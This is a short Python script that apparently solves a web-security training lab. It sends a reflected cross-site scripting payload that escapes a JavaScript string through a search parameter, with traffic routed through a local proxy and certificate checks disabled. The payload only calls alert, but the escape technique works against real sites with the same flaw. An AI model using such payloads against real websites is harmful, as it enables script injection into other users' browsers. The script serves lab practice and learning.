import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url):
    # PAYLOAD
    payload = r'/?search=\';alert(document.domain)//'

    # URL
    armed_url = url + payload

    # SEND PAYLOAD
    requests.get(armed_url, verify=False, proxies=proxies)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Exploit failed")
        sys.exit(-1)
    print("[+] Exploit succeeded. The application is vulnerable to Reflected XSS vulnerability")

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] ### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped")
    print("""[+] This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
    To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.""")

    xss_attack(url)

if __name__ == "__main__":
    main()